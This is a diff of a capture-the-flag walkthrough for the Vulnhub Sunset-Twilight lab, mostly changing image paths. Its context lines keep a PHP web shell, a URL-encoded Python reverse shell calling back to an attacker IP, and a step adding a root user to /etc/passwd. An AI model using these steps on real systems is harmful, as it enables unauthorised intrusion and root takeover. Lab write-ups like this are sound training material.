@@ -2,7 +2,7 @@
 
 Lets check the IP address ➡️
 
-![Untitled](Sunset-Twilight/Untitled.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled.png)
 
 ```bash
 IP : 10.0.2.45
@@ -62,13 +62,13 @@ Service Info: Host: twilight; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web Enumeration ⤵️
 
-![Untitled](Sunset-Twilight/Untitled%201.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%201.png)
 
 Now I also found smb services lets enumerate it also →
 
 ## SMB Enumeration ⤵️
 
-![Untitled](Sunset-Twilight/Untitled%202.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%202.png)
 
 Now I have a directory to Recon further `WRKSHARE` Lets try for smb shell →
 
@@ -126,7 +126,7 @@ system($_GET['cmd']);
 
 In response to that I got this →
 
-![Untitled](Sunset-Twilight/Untitled%203.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%203.png)
 
 So lets run our python payload for reverse shell →
 
@@ -134,11 +134,11 @@ So lets run our python payload for reverse shell →
 http://10.0.2.45/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.27%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
 ```
 
-![Untitled](Sunset-Twilight/Untitled%204.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%204.png)
 
 Now I tried finding SUIDs and GUISs but no luck then I got this →
 
-![Untitled](Sunset-Twilight/Untitled%205.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%205.png)
 
 Now I can add a user in this file and run as root →
 
@@ -163,7 +163,7 @@ shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
 
 I named the user `shiv`. now lets write into the `/etc/passwd` file with nano →
 
-![Untitled](Sunset-Twilight/Untitled%206.png)
+![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%206.png)
 
 ```bash
 www-data@twilight:/$ su shiv
